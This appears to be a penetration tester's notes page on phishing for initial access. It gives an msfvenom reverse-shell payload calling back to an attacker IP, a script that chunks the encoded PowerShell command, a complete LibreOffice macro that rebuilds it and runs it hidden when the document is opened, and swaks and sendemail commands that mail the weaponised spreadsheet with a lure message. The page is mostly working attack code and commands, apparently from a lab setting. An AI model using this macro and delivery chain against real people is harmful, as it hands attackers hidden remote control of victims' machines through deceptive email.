# Email Phishing Attack

Once there is an running smtp/imap service, we can send an malicious email (e.G libreoffice .odt file) to the user and gain an foothold.

---

## Creating Malicious LibreOffice File

1) Create payload using msfvenom


```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=443 -f hta-psh > reverse.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7389 bytes
```

Displayed the reverse.hta and copy pasted the encoded base64 command inside an macro inside libreoffice.

Note: That VBA / Microsoft has an character limit of 255 each line, which means we will have ton conatenate our strings.


Utilized the following script to do so:

```
s = "powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA"

n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```

Opened up LibreOffice in order to create macro and malicious file we send to the admin.

```
libreoffice --calc
```

The Macro I used:

```
Sub Exploit

	Dim Str As String
	
Str = Str + "cmd.exe /c powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
Str = Str + "wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB"
Str = Str + "vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A"
Str = Str + "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ"
Str = Str + "AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU"
Str = Str + "wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB"
Str = Str + "tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A"
Str = Str + "CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA"
Str = Str + "AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc"
Str = Str + "gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB"
Str = Str + "5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA"
Str = Str + "GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
Str = Str + "AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe"
Str = Str + "gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB"
Str = Str + "jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A"
Str = Str + "FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4"
Str = Str + "AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd"
Str = Str + "AByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATwBzAGgARQB"
Str = Str + "tAGsAQwBBADcAVgBXACsAMgAvAGEAewAxAH0AQgBEACsAdgBWA"
Str = Str + "EwALwBCADYAdABDAHcAcABZAEkAcgAzAEIATgBFADYAbgB7ADE"
Str = Str + "AfQAyAFQAeQBDAEMAVQA0AGcAagBrADIAQQBRADYAZQBOAHYAV"
Str = Str + "ABZAEwAYQB5ACsAMQAxADcAeAA2AC8AZAA5AHYAMQB0AGcASgB"
Str = Str + "VAGMAbABkADcAcQB7ADEAfQB1AGgATABCADMANQA3AFgAZgBmA"
Str = Str + "EQATgBqAEwAdwBrAGQAVABsAGcAbwBCAFUAUABwACsAOABjAFA"
Str = Str + "AVQByAFkARwBLAEUASwBCAEoAQgBkAHcAVgBWACsAWABwAE0AS"
Str = Str + "wBpADcAMQB2AEsAeQAyAGwAaABiAFEAVAA2AGgAZgBSAFYAawB"
Str = Str + "xAGYAcQBhAHQAVgBpAEEAewAxAH0ATABoADcAJwAnACsAJwAnA"
Str = Str + "E8AcQBxAG0AVQBRAFIARAB2AG4AaAB2AFgAeQBOAHUAUgByAEg"
Str = Str + "ATwBIAGkAaQBCAE0AZQB5AEkAdgB7ADIAfQBsAGoAZQBZADQAd"
Str = Str + "wBtAGQAMwBUAHcAdgBzAGMATwBtADcAVgBQAGkAegBmAEUAMwB"
Str = Str + "aAEUANgBLAFoAMgBLADYASgBuAEQAbQBXAHoAdABUAFEARgBXA"
Str = Str + "GQAOQA1AGkAQQBSAFcAZABsAGMAVQBjAEwAbAA0AGgAOQAvAEY"
Str = Str + "ASgBYAHAAVwBXADEAVwBiAG4AOQBMAEUASQAzAGwAbwByAG0AT"
Str = Str + "ABPAFEANwBLAEwAcQBWAEYAUgBmAHEAaABDAEkAYwBQAHUAeAB"
Str = Str + "XAFcAaQB3AFoAeABJAGgAWQB6AGoANQBkAEgASgBEAHkAdgBsA"
Str = Str + "DYAewAyAH0AdwBSAGgANgArAEIAVwB0AHIAYgBHAEEAKwBaADI"
Str = Str + "ANQBjAGgATgB1ADgAMwBDAGYAQwBQAEkAbgBDADcARgByAEMAe"
Str = Str + "gBrAEYASwBMAHMATABqAEkARwBLAE8ANgByAG8AUgBqAHUATgB"
Str = Str + "pAHsAMQB9AFoAbwBLAEQAOQBQAFoANwBIAGQANQBtAHIAbQAvA"
Str = Str + "FQAewAyAH0ASgBPAEEAbAB6AFcAUQA0ADQAagB0AGoASgB4AHQ"
Str = Str + "AQwBZAE8AagBzAHQAZABGAEwAbwBVADMAMgBOAHYAQgBsAG8Ab"
Str = Str + "QBqAHsAMgB9AGoAbwAnACcAKwAnACcAegB4ACcAJwArACcAJwB"
Str = Str + "RAEYAeABOAFoAcwBpAGUAVgBDAG0ARgBCAGEAawB2ADYATABHA"
Str = Str + "GYAawBXAGIAMwBMAHcAMwBxAHMAawBIAHkAdQBCADEASQBCAEg"
Str = Str + "AewAxAH0AZwBuAHsAMQB9AGUAdQBxAGkAQgBuAE0AVABpAGcAK"
Str = Str + "wBxAHgAUgBPAFIAcABsACcAJwArACcAJwB4AFEAWQBPAFYAOAB"
Str = Str + "BAEEAaAAvAEMAQgB7ADEAfQA5AG4ARQBMAHgAeQBKAG0AYwBJA"
Str = Str + "E4ASABMAFIAcgA2AG0ANgBRACcAJwArACcAJwBtAEcAbwBPAFU"
Str = Str + "AQgBpAHsAMgB9AG0AcQAvAEYAVwBxAGwAaQBRAEQAdgBDAFAAT"
Str = Str + "wBvAGgAMgA4AEYAaAA2AGkAQgBDAHUAegBaADgAaQBsAEEAagA"
Str = Str + "nACcAKwAnACcAawB2AHYAZABkAFcATABWAGMAVQBhAHQAOQB1A"
Str = Str + "EIAaQBiAHMAVABXADEARwAzACcAJwArACcAJwBOAG0ATABoAFY"
Str = Str + "AYwBVAEsATABpAFQAaQBaAEIANQBtADgAOAB0ADcASgBFAFEAd"
Str = Str + "AAzAFkAaABDAG8AaQBUAFUAMQBZACcAJwArACcAJwArAGwAUgB"
Str = Str + "YAHMAVQBaAHcAaQBVAHMANwBGAGIAaQBGAEMAdQBaAGcAZABZA"
Str = Str + "EwAZQBGAEsAZgBZAFIARgB6AEEATABjAHYAeQBrADEAZwA0AEk"
Str = Str + "AZgA5AGIAVgBFAGsASgBkAEgASwBrAE8AWgBEAGEARwBxAEMAR"
Str = Str + "ABwAHkAdQB0AGcARABwAG0AVABpADMAcABvADQAQQBEAEEATwA"
Str = Str + "3AHcARABXAHcAcwBlAEYAQQByAE8AcABiACcAJwArACcAJwBQA"
Str = Str + "GkAMgBPAFgAZQB4AFQAcwBJAEYAWgBzAFUAeABYAEYASgBHAGk"
Str = Str + "AUgBRAHEAVQA1AEoATQBqAEcAaQAyAEMAMQBKAGEAaABpAFQAN"
Str = Str + "wBFAGgATgBPAEUAcwBmAGkAeQAvAGgARwBnAG4AbAB4AEUARQB"
Str = Str + "4AHoAOAAzAE4AbABOAGQAbwBaAGwANgBiAEwASQB4ADUAbABEA"
Str = Str + "GkAUQBWAFUARABnAHcAVgB4AGgAaAB5AEEAcQBBAEMAbABKAFg"
Str = Str + "AZQBKAGkAYgBXAGMAewAxAH0AUAAvAGQAZQBQAEEAbABIAEUAM"
Str = Str + "QBFAEsANQBRAE8AVwAxAHAAQQBPADIAQgBFAHcAbQBGAHgAdwB"
Str = Str + "KAFkASgBBAGcAUgBkAEsAMgBjAFIAYwBEADEAWQBVAEIAeQBDA"
Str = Str + "FIAdABvAHsAMgB9AE8AUgBUADQAewAyAH0AaQBhAHgARQBVAG0"
Str = Str + "AbwBoAEgANwB2AEYAewAyAH0AMQBIAG0AZABYAEEAZwB2AFUAQ"
Str = Str + "QBsAGgAKwBNAG8AUgBrAGkAMQB7ADEAfQBSAGsAdgB7ADEAfQB"
Str = Str + "UAGEASgBPAFAAUQBnAGcAWABCAEsAcgB2ADgAUgB3ADgALwBOA"
Str = Str + "CcAJwArACcAJwBSAHcAVABUAGoASABDAFcARwBEAG0AdgByAHE"
Str = Str + "AbQAyADQANABMACsAQgBXAC8AQgBCAFUARQB6AGUARgBJAHcAS"
Str = Str + "QBnADUAQQBkAEMASQBXAGEAQwBqAEcAbgB4AHUASABMAGkATgA"
Str = Str + "vAHEAdAB5AFIAcABnAHAAcgByAEkAZgBVAGMATABRAGwAcQBhA"
Str = Str + "GsAYgBVAHQAJwAnACsAJwAnAE0ATgArAEYAbgBrAFgARwBlAHQ"
Str = Str + "AQwAvAGUAbQB0ACsAaABXAG8AdABaADIANwBxAGwANgByAEIAd"
Str = Str + "gBkAFEAVwB2AFkANwBUAGIAVwBQAGQATgB1AGMATABPAHQAOAA"
Str = Str + "1AHUAQgB6AG8AMwAyADQAMgBKAGgAcQB0ADEANwBhADgAdwBuA"
Str = Str + "HUAdABwADkASQBOAFgAbAB1AEwARgBmADkAYwBqAGUANwBLAHY"
Str = Str + "AdQBlAEYAdgA1AHYATgBmADIAbQA2AHEAMgAzAHsAMQB9ADkAO"
Str = Str + "AAxAHgAdQAzAFAATQArAC8AOABNAHoANwAyAG0AOABkAHsAMgB"
Str = Str + "9AGgAOAAxAGgAMQBxADEAagB2AHEAdABkAHQASQBmAGEAUgB1A"
Str = Str + "HQAMgBvAGoAYgBaAE4ATQBkAEUAbQB1ADQANwBIAFgANAB7ADI"
Str = Str + "AfQA5AGkAbQB5AFAASQBxAC8AbQBQAHQARQBwAEYAdABQADEAc"
Str = Str + "gBZAE4AVwAnACcAKwAnACcAYgBzAGQAVgBXADkAbgBwADgANwA"
Str = Str + "rADUANQBuAFgAOAAnACcAKwAnACcAOABOAGQAegBmAHUAVgBpA"
Str = Str + "DUASABqAGEAWABhAFYAdABWAG0AMgBMAFkANwBHAHIAcwBaAGE"
Str = Str + "ANQBFADYAcQBOAGgAVwBSAHgAdABhAGIAVwB7ADIAfQA0AGgAT"
Str = Str + "AAzAFAAJwAnACsAJwAnAGYAcwBWAHIAdwBCADYAdABzAHcANAB"
Str = Str + "5AG0AcQB5AFAASgBrAHoAMQBWAHsAMQB9ADEAcABoAEEARwBhA"
Str = Str + "GEAeQBPADcAVABpAGEAcgB4AC8AcwA1ADIATwBwAEEAQwBFAGE"
Str = Str + "AbAAyAHQAQgBkAHYARwBWAGYAKwBpAE4AaQByAHkAcwAyAHUAc"
Str = Str + "gA3AGwARQA3AFgAWgBhADkAVABjAFIAMwB2AGYAcgBhAE4ANQB"
Str = Str + "iADIASQBuAC8AYwB0AEoANwBMAFoANwByAFkAMgBtAGoAbQB2A"
Str = Str + "HQAbgB0AGEANgBWAHQAdgAzAGwAdABXAFoAagBPAHoAbABaAFA"
Str = Str + "AUgBBAEoAeQBPAHIATgBtAEgAWQAyACcAJwArACcAJwBWAFQAb"
Str = Str + "QBZAEkATgBnADcAYwA1AGUAUABsAFcATQBhADEAKwBmAGIAMgB"
Str = Str + "zACsAKwBMAHAASQA3AFEAYwBrAG8ARQA5ADEAdAAzAEoAcABmA"
Str = Str + "GQASABDAHoAWQB7ADIAfQAvAFcAUAB2AHUAYwBIAFIAeAB2ADc"
Str = Str + "AMwBkAFAAZABXAFoAYQBsAFUAcQA5AGkAJwAnACsAJwAnAGYAS"
Str = Str + "QA5AGQAUQBpAEkAVAArAHYAegB3AHAAcwAnACcAKwAnACcAZQB"
Str = Str + "MAE8AbwBpAFcANwA0ADgAVQBPAEIAagBXAHQASABLAFgAKwByA"
Str = Str + "DIAJwAnACsAJwAnAHgAcwBvAGkAdQBlAEkAQQBoAFcAZwBpACs"
Str = Str + "AZgBWADIARwBGAFIASgArAHYATABBAHsAMgB9AGEARQBoAGkAe"
Str = Str + "gBEAGkARgAvAGkASwBNAFEAVQBaAGkASgBNAHoAWgB6AEcASwB"
Str = Str + "xAFgATQBFAFcATQBoADcAZAA4AHcAawBnADYARABRAHMAdwB0A"
Str = Str + "HsAMQB9AHsAMgB9ACsARABPAHYAVwBrAHsAMQB9AE0AKwBDAHk"
Str = Str + "AcwB1AHsAMgB9AHkATABlAHUAcgBpAFkAUQBvACsAaABBAEMAM"
Str = Str + "QA3AHUANAA5AEQAbgA4ADEASgAxAGUAMQA2AHQAUQBwAE8AdgB"
Str = Str + "iAHEAdQBOAHQAQQBMAGUAZgA3AEUAbQBXACsAMQBrAFkAYQBzA"
Str = Str + "GsAcABvAFQAQQBKAFQATgBOAFUAOQBOAGcAagBYAGkAewAxAH0"
Str = Str + "ATABQACcAJwArACcAJwA5AHEAcABPAEIAYgBnAEUATgBQAGUAa"
Str = Str + "AB1AHIAdAAyAEEARAB6AHsAMgB9AHYAbwBJAHQARABUAEQAcgB"
Str = Str + "VAHQAdwBOAE0AWQBvADgAZgBRAEgAVwA3ADEAegBJAE0AagA0A"
Str = Str + "EEAQwB4AEcAbAB4ADcASwByADQAQwBEAHYAdwBBAEEAMgBmADQ"
Str = Str + "AbQAxAFQAZwBZAGsAUQBlAGoAOQB6AEMATQB2AG0AVgBqAE0Ab"
Str = Str + "gA2AHsAMgB9AHgAegArADMASAA5AGoAegBNAHYAZQBQADUAeQA"
Str = Str + "rAGkAewAyAH0AWABWAFUAbwByAE4AVAA3AHUAdgBOADQANABhA"
Str = Str + "CsAeQArADcALwB3AGcAUgBEAG4ASQBtAHQARgBtAEsARAAxAFA"
Str = Str + "ALwBOAEEAeABaAGoAUgB4AGwAZAA1AGwAQQBBAFgAagBaAEUAb"
Str = Str + "AAvAEQAZAB3AGsALwB1ADQAVgB2AHEANwBUAFAALwB3ADEAcgA"
Str = Str + "2AHcAVABuAGgAdwBzAEEAQQBBAHsAMAB9AHsAMAB9ACcAJwApA"
Str = Str + "C0AZgAnACcAPQAnACcALAAnACcAUwAnACcALAAnACcAMAAnACc"
Str = Str + "AKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8Ab"
Str = Str + "QBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQB"
Str = Str + "vAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzA"
Str = Str + "CkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADs"
Str = Str + "AJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAP"
Str = Str + "QAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdAB"
Str = Str + "TAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1A"
Str = Str + "GUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEg"
Str = Str + "AaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AV"
Str = Str + "wBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQB"
Str = Str + "zAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByA"
Str = Str + "G8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA="
Str = Str + "="
	
	Shell(Str), vbHide
	
End Sub
```

Mapped macro to "Open Document" function, so when the user openes up the file our reverse shell get's executed, without even him seeing the content, due to the "vbHide" flag.

## Sending Mail with swaks

```
swaks -t mailadmin@localhost --from jonas@localhost --attach @exploit.ods --server 192.168.145.140 --body 'Please check this spreadsheet' --header 'Subject: Please check this spreadsheet'
=== Trying 192.168.145.140:25...
=== Connected to 192.168.145.140.
<-  220 localhost ESMTP server ready.
 -> EHLO kali
<-  250-localhost Hello kali; ESMTPs are:
<-  250-TIME
<-  250-SIZE 0
<-  250 HELP
 -> MAIL FROM:<jonas@localhost>
<-  250 Sender OK - send RCPTs.
 -> RCPT TO:<mailadmin@localhost>
<-  250 Recipient OK - send RCPT or DATA.
 -> DATA
<-  354 OK, send data, end with CRLF.CRLF
 -> Date: Mon, 10 Nov 2025 15:05:32 -0500
 -> To: mailadmin@localhost
 -> From: jonas@localhost
 -> Subject: Please check this spreadsheet
 -> Message-Id: <20251110150532.003044@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_3044"
 -> 
 -> ------=_MIME_BOUNDARY_000_3044
 -> Content-Type: text/plain
 -> 
 -> Please check this spreadsheet
```
 
## Sending Mail with sendemail


```
sendemail -f 'jonas@localhost' \
                      -t 'mailadmin@localhost' \
                      -s 192.168.215.140:25 \
                      -u 'Your spreadsheet' \
                      -m 'Here is your requested spreadsheet' \
                      -a remote.ods
                      ```
 
